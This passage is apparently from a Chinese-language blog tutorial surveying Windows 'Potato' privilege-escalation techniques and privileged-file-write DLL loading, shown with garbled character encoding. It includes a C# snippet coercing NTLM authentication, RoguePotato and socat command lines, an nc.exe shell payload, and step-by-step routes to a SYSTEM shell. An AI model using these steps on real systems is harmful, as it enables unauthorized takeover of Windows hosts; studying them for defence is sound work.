å»è·å–æŒ‡å®šçš„å¯¹è±¡å®ä¾‹ï¼Œè¯¥å¯¹è±¡å®ä¾‹çš„ Guid ä¸º 4991d34b-80a1-4291-83b6-3328366b9097ï¼Œå¯¹åº” BITS å®ä¾‹ã€‚å¦‚æœæ­¤æ—¶æ”»å‡»è€…åœ¨ 127.0.0.1:6666 ç«¯å£æ­£å¸¸å›å¤ï¼Œå°±å¯ä»¥å¼ºåˆ¶è®© COM ä»¥ SYSTEM æƒé™å¯¹ 6666 ç«¯å£å‘èµ· net-NTLM è®¤è¯ã€‚ï¼ˆä¸ºä»€ä¹ˆé€‰æ‹© BITS å®ä¾‹ï¼Œæ˜¯å› ä¸º BITS å®ç°äº† IMarshal æ¥å£å¹¶å…è®¸ä»£ç†å£°æ˜å¼ºåˆ¶ NTLM èº«ä»½éªŒè¯ï¼‰ public static void BootstrapComMarshal() { IStorage stg = ComUtils.CreateStorage(); // Use a known local system service COM server, in this cast BITSv1 Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097"); TestClass c = new TestClass(stg, String.Format("{0}[{1}]", "127.0.0.1", 6666)); // ip and port MULTI_QI[] qis = new MULTI_QI[1]; qis[0].pIID = ComUtils.IID_IUnknownPtr; qis[0].pItf = null; qis[0].hr = 0; CoGetInstanceFromIStorage(null, ref clsid, null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis); } å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå®Œæˆè¿™ä¸€æ¬¡ NTLM è®¤è¯ï¼Œå°±å¯ä»¥è·å–åˆ° tokenï¼Œä½œè€…ä¹Ÿä½¿ç”¨äº†ä¸€ä¸ªå·§å¦™çš„æ–¹æ³•ï¼Œè°ƒç”¨ AcceptSecurityContext å‡½æ•°æ¥å¤„ç† NLTM è®¤è¯ AcceptSecurityContext æ˜¯ Windows API ä¸­ç”¨äºå®‰å…¨ä¸Šä¸‹æ–‡å»ºç«‹çš„å‡½æ•°ä¹‹ä¸€ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨å®‰å…¨å¥—æ¥å­—ï¼ˆSecure Socket Layerï¼ŒSSLï¼‰æˆ–è€…å®‰å…¨çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRemote Procedure Callï¼ŒRPCï¼‰ç­‰åœºæ™¯ä¸‹ã€‚å®ƒé€šå¸¸ç”¨äºåœ¨æœåŠ¡ç«¯æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„èº«ä»½éªŒè¯ï¼Œå¹¶å»ºç«‹ä¸€ä¸ªå®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆsecurity contextï¼‰ä»¥ä¾¿è¿›è¡Œåç»­çš„å®‰å…¨é€šä¿¡ã€‚è¿™æ ·ä¸€æ¥ï¼ŒCOM å……å½“å®¢æˆ·ç«¯ï¼ŒAcceptSecurityContext å……å½“æœåŠ¡ç«¯ï¼Œå°±èƒ½å¤Ÿå®Œæˆ NTLM è®¤è¯ã€‚ å°½ç®¡æ”»å‡»è€…ä½œä¸ºä¸­é—´äººå°† AcceptSecurityContext ä¸ COM ä¹‹é—´å»ºç«‹èµ·äº† NTLM è®¤è¯ï¼Œä½†ä¸¤è€…ä¹‹é—´çš„äº¤äº’è¿‡ç¨‹å¹¶ä¸æ˜¯ç®€å•çš„è½¬å‘ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š è¦æ­£ç¡®å“åº” COM æœåŠ¡ï¼Œéœ€è¦æ­£ç¡®çš„ RPC åè®®çš„æ•°æ®åŒ…ã€‚ä½œè€…å°† COM çš„è¯·æ±‚å‘é€åˆ° 135 ç«¯å£çš„ rpcss æœåŠ¡æ¥è·å–ä¸€ä¸ªå“åº”æ¨¡æ¿ã€‚ ä¸¤ä¸ªæ¬¡ NTLM Challenge æŠ¥æ–‡ä¸­çš„ NTLM Server Challenge ä»¥åŠ Reserved å­—æ®µä¸åŒï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ã€‚ ä¸Šè¿°çš„ä¸¤ä¸ªé—®é¢˜è§£å†³ä¹‹åï¼Œå°±å¯ä»¥å·§å¦™åœ°è·å–åˆ° SYSTEM tokenã€‚æœ‰äº† SYSTEM æƒé™çš„ token ä¹‹åï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ‹¥æœ‰ SelmpersonatePrivilege æˆ–è€… SeAssignPrimaryToken æƒé™ï¼Œå°±å¯ä»¥é€šè¿‡è¯¥ Token åˆ›å»ºæ–°è¿›ç¨‹è¾¾æˆææƒã€‚ æ­¥éª¤å¦‚ä¸‹ï¼š åˆ©ç”¨ CoGetInstanceFromIStorage API å¼ºåˆ¶ NT AUTHORITY/SYSTEM è¿è¡Œçš„ RPC æœåŠ¡å‘æˆ‘ä»¬çš„æœ¬åœ°ä»£ç†(localhost:6666)å‘èµ· NTLM èº«ä»½éªŒè¯ã€‚ CoGetInstanceFromIStorage API RPC å‘ä»£ç†å‘é€ NTLM Negotiate åŒ…ã€‚ ä»£ç†å°† NTLM Negotiate åŒ…è½¬å‘ç»™ç«¯å£ 135 çš„ RPC æœåŠ¡ã€‚äºæ­¤åŒæ—¶ï¼Œè°ƒç”¨ AcceptSecurityContext æ¥å¼ºåˆ¶è¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯ã€‚ RPC 135 å’Œ AcceptSecurityContext å‘ä»£ç†å‘é€ NTLM Challengeã€‚ä¸¤ä¸ªæ•°æ®åŒ…çš„å†…å®¹è¢«æ··åˆä»¥åŒ¹é…æœ¬åœ°åå•†å¹¶è½¬å‘åˆ° RPCï¼Œå…¶ä¸­ RPC 135 å“åº”çš„æŠ¥æ–‡å……å½“ RPC è°ƒç”¨çš„æ¨¡æ¿ã€‚ RPC ä½¿ç”¨ NLTM Auth åŒ…è¿›è¡Œå“åº”ï¼Œè¯¥åŒ…è¢«ä»£ç†æœåŠ¡å™¨å‘é€åˆ° AcceptSecurityContext (8.) å¹¶æ‰§è¡Œæ¨¡æ‹Ÿ (9.)ã€‚ å½±å“èŒƒå›´ï¼š &lt; win10 1809 å’Œ windows server 2019 ç›¸å…³æ¦‚å¿µï¼š åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹(DCOM) COM æ˜¯ Windows çš„ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒä¿ƒè¿›äº†è½¯ä»¶ä¹‹é—´çš„äº’æ“ä½œæ€§ï¼ŒDCOM é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)åœ¨ç½‘ç»œä¸Šæ‰©å±•äº†è¿™ä¸€ç‚¹ã€‚ åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡(BITS) å¯ä¾›ç¨‹åºå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜ç”¨äºä» HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ä¸‹è½½æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä¸­ã€‚ Windows Updateï¼š BITS æœåŠ¡ç”¨äºä¸‹è½½å’Œå®‰è£… Windows æ›´æ–°ã€‚ Windows Defender ç—…æ¯’å®šä¹‰æ›´æ–°ï¼š BITS ç”¨äºåå°æ›´æ–° Windows Defender ç—…æ¯’å®šä¹‰ã€‚ åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿæ›´æ–°ï¼š ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿç»„ä»¶å¯ä»¥åˆ©ç”¨ BITS è¿›è¡Œåå°æ›´æ–°ã€‚ CLSIDæ˜¯æ ‡è¯† COM ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼UUIDçš„æ ‡è¯†ç¬¦ã€‚ Juicy Potato Rotten Potato çš„ PoC ä½¿ç”¨äº† COM æ¥æ¿€æ´» BITS æœåŠ¡ã€‚Windows åœ¨ä¿®è¡¥ Rotten Potato æ—¶ï¼Œç¦ç”¨äº† BITS æœåŠ¡ï¼Œå¹¶ä¸”å ç”¨äº† 6666 ç«¯å£ï¼Œä½†è¯¥ä¿®è¡¥å¹¶ä¸èƒ½å®Œå…¨æœç»è¿™ç±»é—®é¢˜ï¼Œä½œè€…æ‰¾åˆ°äº†å…¶ä»–å¯ä»¥é€‰æ‹©çš„ COM å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥å‘èµ· NTLM è¯·æ±‚ã€‚ å…¶å…·ä½“åˆ©ç”¨è¿‡ç¨‹ä¸ Rotten Potato ç±»ä¼¼ï¼š Juicy Potato é€šè¿‡ä¼ é€’ BITS çš„ CLSID å’Œ IStorage å¯¹è±¡å®ä¾‹ç»™ CoGetInstanceFromIStorage å‡½æ•°ï¼Œä½¿å¾— rpcss æ¿€æ´» BITS æœåŠ¡ã€‚ éšå rpcss çš„ DCOM OXID resolver ä¼šè§£æåºåˆ—åŒ–æ•°æ®ä¸­çš„ OBJREF æ‹¿åˆ°DUALSTRINGARRAY å­—æ®µï¼Œè¯¥å­—æ®µæŒ‡å®šäº† host[port] æ ¼å¼çš„ locationï¼Œç»‘å®šå¯¹è±¡æ—¶ä¼šå‘å…¶ä¸­çš„ host[port] å‘é€ DEC/RPC è¯·æ±‚ï¼Œè¿™æ—¶ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†è¿™ä¸ªç«¯å£ï¼Œå°±å¯ä»¥è¦æ±‚è¿›è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆé«˜æƒé™æœåŠ¡å°±ä¼šå‘é€ net-NTLM è¿›è¡Œè®¤è¯ã€‚ å…¶åçš„è¿‡ç¨‹ä¸ Rotten Potato ä¸€è‡´ å½±å“èŒƒå›´ï¼š &lt; Windows 10 1809 &lt; Windows Server 2019 Pipe Potatoï¼ˆPrintSpooferï¼‰ å‘½åç®¡é“ææƒåŸç†ï¼š windows ä¸­æœ‰ä¸€ä¸ª API ImpersonateNamedPipeClient()ï¼Œå…è®¸æœåŠ¡ç«¯è¿›ç¨‹å¯¹è¿æ¥åˆ°å®ƒçš„å®¢æˆ·ç«¯è¿›ç¨‹è¿›è¡Œæ¨¡æ‹Ÿã€‚é€šè¿‡è°ƒç”¨ ImpersonateNamedPipeClient()ï¼Œå‘½åç®¡é“æœåŠ¡ç«¯å¯ä»¥æ¨¡æ‹Ÿå‘½åç®¡é“å®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œä»è€Œç›´æ¥å°†å‘½åç®¡é“æœåŠ¡ç«¯å½“å‰çº¿ç¨‹çš„ Token ä»¤ç‰Œæ›´æ”¹ä¸ºå‘½åç®¡é“å®¢æˆ·ç«¯çš„ Tokenä»¤ç‰Œã€‚ å› æ­¤å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬åˆ›å»ºçš„å‘½åç®¡é“ã€‚ PrintSpoofer åŸç†ï¼š Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚ MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() å‡½æ•°åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å°±æ˜¯é€šè¿‡å‘½åç®¡é“å®ç°è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥æ˜¯ \127.0.0.1\pipe\demoï¼Œ spoolsv.exe è¿›ç¨‹ä¹Ÿä¼šå¯¹Server nameåšäº†æ ¡éªŒï¼Œæœ€åè¿˜æ˜¯ä¼šæ›¿æ¢æˆ \192.168.110.137\pipe\spools ç®¡é“ã€‚ ä½œè€…åœ¨è¿™é‡Œåˆ©ç”¨äº† windows UNC è·¯å¾„è§„èŒƒåŒ–çš„æŠ€å·§ç»•è¿‡äº†è¿™ä¸ªé™åˆ¶ è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚ åˆ©ç”¨å·¥å…·ï¼š itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€ å‚è€ƒï¼š Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶ Bad Potato BadPotatoæ˜¯C#ç‰ˆæœ¬çš„PrintSpoolerï¼Œç»“æ„ä»£ç ä¹Ÿæ›´åŠ ç®€åŒ–ï¼Œå¹¶ä¸”æ¶æ„ç®¡é“æœåŠ¡ç«¯ç”¨çš„æ˜¯å¯¹æ–¹æœºå™¨çš„åå­—ï¼Œè€ŒPrintSpoolerç”¨çš„æ˜¯éšæœºç”Ÿæˆçš„UUIDï¼ŒpipePotatoåˆ™æ˜¯å›ºå®šçš„â€xxxâ€ï¼ˆå¯¼è‡´å¯ç”¨æ€§ä¹Ÿæ›´ä½ï¼‰ åˆ©ç”¨å·¥å…·ï¼š BeichenDream/BadPotato: Windows æƒé™æå‡ BadPotato Rogue Potato ä¸ºäº†ä¿®è¡¥ Juicy Potatoï¼Œé«˜ç‰ˆæœ¬çš„ Windows DCOM è§£æå™¨ä¸å…è®¸ OBJREF ä¸­çš„ DUALSTRINGARRAY å­—æ®µæŒ‡å®šç«¯å£å·ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š æˆ‘ä»¬éœ€è¦æœ‰ä¸€å°æœºå™¨åœ¨æˆ‘ä»¬çš„æ§åˆ¶ä¹‹ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œé‡å®šå‘ï¼Œå¹¶ä¸”å—å®³è€…å¿…é¡»å¯ä»¥åœ¨ç«¯å£ 135ä¸Šè®¿é—®è¯¥æœºå™¨ æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸¤ä¸ª exe æ–‡ä»¶ï¼Œå½“å—å®³è€…çš„é˜²ç«å¢™ä¸æ¥å—ä¼ å…¥è¿æ¥æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨æˆ‘ä»¬æ§åˆ¶çš„ Windows æœºå™¨ä¸Šä»¥ç‹¬ç«‹æ¨¡å¼å¯åŠ¨ä¼ªé€ çš„ OXID è§£æå™¨ åˆ©ç”¨æ€è·¯ï¼š Rogue Potato çš„åˆ©ç”¨æ€è·¯æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨çš„ 135 ç«¯å£ä¸Šåšä¸€ä¸ªè½¬å‘ï¼Œç”¨äºå°† OXID è§£æè¯·æ±‚é‡å®šå‘åˆ°ä¸€ä¸ªå‡çš„OXID RPC æœåŠ¡å™¨ã€‚ ä¼ªé€ çš„OXID RPC æœåŠ¡å™¨å®ç°äº†ResolveOxid2æœåŠ¡å™¨è¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹å°†æŒ‡å‘å—æ§å‘½åç®¡é“[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper] DCOM æœåŠ¡å™¨å°†è¿æ¥åˆ° RPC æœåŠ¡å™¨ä»¥æ‰§è¡Œ IRemUnkown2 æ¥å£è°ƒç”¨ã€‚é€šè¿‡è¿æ¥åˆ°å‘½åç®¡é“ï¼Œå°†æ‰§è¡Œâ€èº«ä»½éªŒè¯å›è°ƒâ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ RpcImpersonateClient()è°ƒç”¨æ¨¡æ‹Ÿè°ƒç”¨è€…ã€‚ ç„¶å,ä»¤ç‰Œçªƒå–è€… 1.è·å–rpcssæœåŠ¡çš„PID 2.æ‰“å¼€è¿›ç¨‹ï¼Œåˆ—å‡ºæ‰€æœ‰å¥æŸ„ï¼Œå¹¶ä¸ºæ¯ä¸ªå¥æŸ„å°è¯•å¤åˆ¶å®ƒå¹¶è·å–å¥æŸ„ç±»å‹ 3.å¦‚æœå¥æŸ„ç±»å‹ä¸ºâ€Tokenâ€ä¸”ä»¤ç‰Œæ‰€æœ‰è€…ä¸º SYSTEMï¼Œåˆ™å°è¯•ä½¿ç”¨CreatProcessAsUser()æˆ–CreateProcessWithToken()æ¨¡æ‹Ÿå¹¶å¯åŠ¨è¿›ç¨‹ å½±å“èŒƒå›´ï¼š &gt;= Windows 10 1809 &amp; Windows Server 2019 åˆ©ç”¨å·¥å…·ï¼š https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode EfsPotatoï¼ˆPetitPotamï¼‰ åˆ©ç”¨EFSRPCï¼ˆåŠ å¯†æ–‡ä»¶ç³»ç»Ÿè¿œç¨‹åè®®ï¼‰ï¼Œè¿›è¡ŒNTLMä¸­ç»§æ”»å‡»å¯å®ç°ADåŸŸå†…æƒé™æå‡æˆ–æœ¬åœ°æƒé™æå‡ã€‚ å½±å“èŒƒå›´ï¼š Windows Server, version 20H2 (Server Core Installation) Windows Server, version 2004 (Server Core installation) Windows Server 2019 (Server Core installation) Windows Server 2019 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 åˆ©ç”¨å·¥å…·ï¼š zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability). bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc. Ghost potatoï¼ˆMS08-068 ç»•è¿‡ï¼‰ ä¸ºé˜²æ­¢ç”¨æˆ· relay æœ¬æœºï¼Œåœ¨ lsass ä¸­æ·»åŠ ç¼“å­˜ç»•è¿‡ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰ (Challenge,cifs/B) å°±ä¼šè®¤è¯å¤±è´¥ã€‚ ç„¶è€Œè¿™ä¸ª (Challenge,cifs/B) æ˜¯æœ‰æ—¶æ•ˆæ€§çš„ï¼ˆ300sï¼‰ï¼Œæ‰€æœ‰åªè¦ç­‰ 300s å†å‘é€ type3 å°±å¯ä»¥ bypass äº†ã€‚ ç”¨ä¿®æ”¹åçš„ impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip å¯ä»¥ç›´æ¥æ‰“ï¼Œç”¨æ³•å’ŒMS08-068 ç±»ä¼¼ã€‚ Sweet Potato é›†æˆäº†å‰é¢å‡ ç§åœŸè±†è§¦å‘ NTLM è®¤è¯çš„æ–¹å¼ï¼ŒåŒ…æ‹¬ï¼šCOMï¼ŒWinRMï¼ŒSpoolsvï¼Œå…¶ä¸­ WInRM çš„æ”»å‡»åŸç†å‚è€ƒï¼šhttps://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/ å¤§è‡´æ€è·¯å°±æ˜¯å½“ WinRM åœ¨å½“å‰ç³»ç»Ÿæœªå¯ç”¨æ—¶ï¼Œæ”»å‡»è€…ç›‘å¬æœ¬æœº 5985 ç«¯å£ï¼ŒBITS æœåŠ¡ä¼šå‘ WinRM 5985 å‘èµ· NTLM è®¤è¯ã€‚ RottenPotato Weaponized JuciyPotato with BITS WinRM discovery PrintSpoofer discovery and original exploit EfsRpc built on EfsPotato PetitPotam åˆ©ç”¨å·¥å…·ï¼šCCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019 Generic Potato SweetPotato çš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œ æ˜¯@micahvandeusen ç”¨äºæ”¯æŒé€šè¿‡ HTTP å’Œ/æˆ–å‘½åç®¡é“æ¨¡æ‹Ÿèº«ä»½éªŒè¯ã€‚ è¿™å…è®¸ä» SSRF å’Œ/æˆ–æ–‡ä»¶å†™å…¥è¿›è¡Œæœ¬åœ°æƒé™å‡çº§ã€‚ åœ¨ä»¥ä¸‹æƒ…å†µä¸‹å®ƒå¾ˆæ–¹ä¾¿ï¼š æˆ‘ä»¬æœ‰æƒè®¿é—®çš„ç”¨æˆ·æ‹¥æœ‰ SeImpersonatePrivilege ç³»ç»Ÿæ²¡æœ‰è¿è¡Œæ‰“å°æœåŠ¡ï¼Œè¿™ä¼šé˜»æ­¢ SweetPotato ã€‚ WinRM æ­£åœ¨è¿è¡Œä»¥é˜²æ­¢ RogueWinRM æ‚¨ä¸å…è®¸å¯¹æ‚¨æ§åˆ¶çš„ä»»ä½•è®¡ç®—æœºè¿›è¡Œå‡ºç«™ RPCï¼Œå¹¶ä¸”ç¦ç”¨ BITS æœåŠ¡ä»¥é˜²æ­¢ RoguePotato ã€‚ åˆ©ç”¨å·¥å…·ï¼š micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes. JuicyPotatoNG Giving JuicyPotato a second chance: JuicyPotatoNG â€“ Decoderâ€™s Blog åˆ©ç”¨å·¥å…·ï¼š antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System GodPotato å½±å“èŒƒå›´ï¼š Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11 åˆ©ç”¨å·¥å…·ï¼š BeichenDream/GodPotato é¶åœº Juicy Potato - HackTheBox-Jeeves Rogue Potato - HackTheBox-Remote å‚è€ƒï¼š Potatoes - Windows Privilege Escalation Â· Jorge Lajara Website Potato å®¶æ—ææƒåˆ†æ - Geekbyâ€™s Blog ã€ç²¾é€‰ã€‘Rotten/Juicy Potatoææƒå·¥åŸç†åˆ†æ_rottenpotato-CSDNåšå®¢ Potato å®¶æ—ææƒå­¦ä¹  NTLM-relayæ”»å‡»çš„åŸç†ä¸å®ç° Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶ é€šè¿‡ç‰¹æƒæ–‡ä»¶å†™å…¥ææƒ DiagHub ä»ç‰ˆæœ¬ 1903 åŠæ›´é«˜ç‰ˆæœ¬å¼€å§‹ï¼ŒDiagHub ä¸èƒ½å†ç”¨äºåŠ è½½ä»»æ„ DLLã€‚ Microsoft è¯Šæ–­ä¸­å¿ƒæ ‡å‡†æ”¶é›†å™¨æœåŠ¡ (DiagHub) æ˜¯ä¸€é¡¹æ”¶é›†è·Ÿè¸ªä¿¡æ¯å¹¶é€šè¿‡ DCOM ä»¥ç¼–ç¨‹æ–¹å¼å…¬å¼€çš„æœåŠ¡ã€‚ è¯¥ DCOM å¯¹è±¡å¯ç”¨äºå°† DLL åŠ è½½åˆ° SYSTEM è¿›ç¨‹ä¸­ï¼Œå‰ææ˜¯è¯¥ DLL å­˜åœ¨äº C:\Windows\System32 ç›®å½•ä¸­ã€‚ åˆ©ç”¨æ­¥éª¤ï¼š åˆ›å»ºä¸€ä¸ªé‚ªæ¶çš„ DLL ä¾‹å¦‚ï¼špayload.dll å¹¶å°†å…¶ç§»è‡³ C:\Windows\System32 build https://github.com/xct/diaghub diaghub.exe c:\ProgramData\ Payload.dll é»˜è®¤æœ‰æ•ˆè´Ÿè½½å°†è¿è¡Œ C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe UsoDLLLoader 2020-06-06 æ›´æ–°ï¼šæ­¤æŠ€å·§ä¸å†é€‚ç”¨äºæœ€æ–°ç‰ˆæœ¬çš„ Windows 10 Insider Previewã€‚ å¦‚æœæˆ‘ä»¬åœ¨ Windows æˆ–æŸäº›ç¬¬ä¸‰æ–¹è½¯ä»¶ä¸­å‘ç°ç‰¹æƒæ–‡ä»¶å†™å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªå·±ç‰ˆæœ¬çš„ windowscoredeviceinfo.dll å¤åˆ¶åˆ° C:\Windows\Sytem32\ä¸­ï¼Œç„¶åè®© USO æœåŠ¡ä»¥ NT AUTHORITY\System çš„èº«ä»½åŠ è½½å®ƒã€‚ åˆ©ç”¨æ­¥éª¤ï¼š æ„å»º https://github.com/itm4n/UsoDllLoader é€‰æ‹©å‘å¸ƒé…ç½®å’Œ x64 æ¶æ„ã€‚ æ„å»ºè§£å†³æ–¹æ¡ˆã€‚ DLL .\x64\Release\WindowsCoreDeviceInfo.dll åŠ è½½ç¨‹åº.\x64\Release\UsoDllLoader.exeã€‚ å°† WindowsCoreDeviceInfo.dll å¤åˆ¶åˆ° C:\Windows\System32\ ä½¿ç”¨åŠ è½½ç¨‹åºå¹¶ç­‰å¾… shell æˆ–è¿è¡Œ usoclient StartInteractiveScan å¹¶è¿æ¥åˆ°ç«¯å£ 1337 ä¸Šçš„ç»‘å®š shellã€‚ WerTrigger åˆ©ç”¨ Windows é—®é¢˜æŠ¥å‘Šå†™å…¥ç‰¹æƒã€‚ åˆ©ç”¨æ­¥éª¤ï¼š å…‹éš† https://github.com/sailay1996/WerTrigger å°† phoneinfo.dll å¤åˆ¶åˆ°C:\Windows\System32\ å°† Report.wer æ–‡ä»¶å’Œ WerTrigger.exe æ”¾åœ¨åŒä¸€ç›®å½•ä¸­ã€‚ ç„¶åï¼Œè¿è¡Œ WerTrigger.exeã€‚ äº«å— NT AUTHORITY\SYSTEM çš„ shell WerMgr åˆ©ç”¨ Windows é”™è¯¯æŠ¥å‘Šçš„ç‰¹æƒç›®å½•åˆ›å»ºé”™è¯¯è¾¾æˆææƒ åˆ©ç”¨æ­¥éª¤ï¼š Clone https://github.com/binderlabs/DirCreate2System Create directory C:\Windows\System32\wermgr.exe.local\ Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe. Enjoy a shell as NT AUTHORITY\SYSTEM é€šè¿‡ç‰¹æƒæ–‡ä»¶åˆ é™¤ææƒ åœ¨ MSI å®‰è£…æœŸé—´ï¼ŒWindows Installer 